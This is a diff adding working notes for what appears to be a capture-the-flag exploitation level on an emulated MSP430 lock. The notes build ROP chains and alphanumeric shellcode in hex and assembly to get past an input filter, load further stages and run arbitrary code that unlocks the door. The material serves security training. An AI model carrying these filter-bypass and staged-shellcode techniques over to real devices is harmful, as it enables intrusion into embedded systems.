@@ -1,0 +1,172 @@
+=> We have until 4468 of shellcode, but have to start at 4430 and waste lots of space
+
+That alphanum only filter is super annoying, we basically can't write anything to memory ourselves.
+I can't find any useful alphanum instruction, so we'll have to ROP.
+
+=> Use memset to make a nop sled and jump into it?
+==> Not possible
+
+=> Set 445D to 0x00 in conditional_unlock_door, then let it go to INT with r15==0x7f
+=> We just need to set r4 to 4461 then
+=> Okay that makes an invalid instruction, but we can keep the idea, zero out somewhere else and jump there
+==> First make sure we can get a stable zeroing shellcode
+==> 3450 <target+4> 3041 with 4e44 on the top of the stack
+==> It's pretty unstable though, will mess with the stack and jump to the target
+
+=> Zero out 45FD, then ROP to <INT>
+==> We got a ROP to <INT> at 4656, that's perfect
+==> Now we "just" need to zero-out 45FD, so target is 4601
+==> 45FD+3035=7632
+
+=> If we zero 465A, do we get to return to a register set value?
+==> YES! We get a jump to r15 (or r4+15, either work)
+==> So we need to use that to jump to 4602 with r14=7f
+==> So we need r15=4602, r14=7F and r4=4654
+===> r15: 365046464f464f6f4f6f4f6f4f6f4f6f67534f47	 add #0x4646, r6;mov.b r6, r15;rlc.b r15;rlc.b r15;rlc.b r15;rlc.b r15;rlc.b r15;incd.b r7;mov.b r7, r15
+===> r14: 37504a4a375035354e47		add #0x4a4a, r7; add #0x3535, r7; mov.b r7, r14
+===> r4: 34505446	add #0x4654, r4
+====> Doesn't work, can't put stuff in r14/r15 high bits
+=====> Can use incd.b r6 to make the 02 and mov #0x4646 for the 46
+
+4444444444444444444444444444445446304456444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444431523152315231523152315231523152564444444a4a34505646365035354f463041
+4444444444444444444444444444445446304456444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444431523152315231523152315231523152345056465644304137504a4a375035354f474a4a4a4a
+
+let r4=446e; let r14=4460; let r15=446a
+
+=> Okay I might have found a way to solve it, worked with manual tampering
+=> We move sp to 4440 so we can move sp around that later
+=> We get it to push r14 and r15 with 7f and 4656
+=> We move sp on the address of the 4656, which is just before the 7f
+=> Now we ret, it'll go to 4656, which will call <INT> with 7f as argument
+
+=> Older version
+31523152315231523152315231523152		spam add #0x8, sp
+56444444					addr for ret and mov 4a4a, r6
+4a4a						NOP, used by previous instr
+34505646					add #0x4656, r4
+365035354f46					equivalent to mov #0x7f, r15
+3041						ret
+
+=> Attempt #2
+31523152315231523152315231523152		spam add #0x8, sp
+34505646					add #0x4656, r4
+56443041					addr for ret and mov 4a4a, r6
+37504a4a375035354f47				equivalent to mov #0x7f, r15
+3041						ret
+
+Could save some bytes by ROPing to 446a instead of only 3152 spam
+=> We can't mov to sp, but we can do 3141 pop sp, even better
+
+The new plan is to push 7f then push 4656 in two calls
+We'll use ROP and popping sp to move our pointers around
+We can reserve 4430 for the 4656, 4432 for the 7f
+We can't jump before 4430, but we can store ROP there 
+and pop sp back there to save some space on the second call
+We don't want to start near 4434, because the push calls
+will get their ret address around here
+=> We should try to build it live as we run, and copy back to the
+=> notepad immediately, so we see if it's implementable immediately
+
+# Live shellcode
+
+=> Top of stack at 43FE:
+XX44 3444
+XX is location of first shellcode
+
+=> First shellcode
+add	#0x4a4a, r7
+nop	5644 5555
+pop sp
+nop	4444
+add	#0x3535, r7
+mov.b	r7, r4
+ret
+nop 	3244
+add	#0x8, sp
+pop	sp
+37504a4a56445555314144443750353544473041324431523141
+
+3244
+
+
+=> On the first run we could put 7f in r15 and a return address in r4
+add	#0x4a4a, r7
+nop	5644 5555
+pop 	sp
+nop	4a44
+nop	4a44
+add	#0x3535, r7
+mov.b	r7, r15
+add 	#0x4448, r4
+ret
+nop 	3244
+add	#0x8, sp
+pop	sp
+37504a4a5644555531414444375035354f47345048443041324431523141
+
+
+=> We could use mov sp, r15 at 45da, it calls 4446 right after
+==> But if we put crap in sp, how are we supposed to jump to 45da?
+
+=> Hey wait, who said we couldn't have the first shellcode load another shellcode?
+=> We can just jump back to main after having modified memory a bit
+
+=> Have unlock push a 0x7F as low as possible on the stack, then return to main
+=> Now we craft a shellcode that ends just before the 0x7F with a 5646
+=> And that shellcode just needs to pop sp to the 5646 and ret
+
+=> First try to make a shellcode that chains to another shellcode
+=> sp is 43fe at <login>, 43ec at 4564
+==> It works! We don't need to change sp, it just works
+
+5555555555555555555555555555555555304434445555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555537504a4a5644555531414444375035354f47345048443041324431523141
+
+=> So now we can do the ret-to-r4 thing
+==> We need pc=4638, r4=4602, r15=0 and r14=7f with 464A zeroed out
+==> let 464A=0; let r4=4602; let r15=0; let r14=7f; let pc=4638;
+===> Doesn't work, r14 gets overwritten
+
+=> We could just zero out the alphanum checks and then we're free
+=> What we really want is the 7A-FF range
+==> If we zero-out that check, it doesn't stop at 00 either, infinite loop
+
+=> We could zero-out the memset, zero at 45d6, then jump way backward into the 2400's
+=> Yes! We can jump to 0x4848, there's nothing there so the rrc pc will teleport us to 0x2425 !
+
+=> So here's the new-new-new-new-new plan
+=> First stage shellcode zeroes-out the memset and loads second stage
+=> Second stage jumps to 0x4848 and lands on 0x2425, which is arbitrary shellcode
+=> Third stage, the shellcode at 0x2425 unlocks the door
+
+
+=> First stage
+
+# Payload: set r4 to 45DA and ret to zeroing code
+add	#0x6161, r6
+mov.b	r6, r4
+add	#0x4579, r4
+ret
+
+365061614446345079453041
+
+# Shellcode:
+555555555555555555555555555555555530444e4455555555644555555555555555555555555555555555555555555555555555555555555555555555555555555555365061614446345079453041
+
+=> Second and third stage
+
+# Payload: Return to 0x4832 for a teleport to 0x241a
+padding
+ROP 0x4832 to third stage
+padding
+push #0x7F
+call #0x45FC
+
+30127f00b012fc45
+
+# Shellcode:
+555555555555555555555555555555324846494e414c4c59212130127f00b012fc45
+
+This is awesome. The alphanum protection is bypassed, so we have full control of the hardware!
+Now we can load and run arbitrary amounts of arbitrary code by just sending new password prompts whenever we want and running that directly.
+Not the smallest or most efficient solution by far, but now that level is REALLY solved.
+
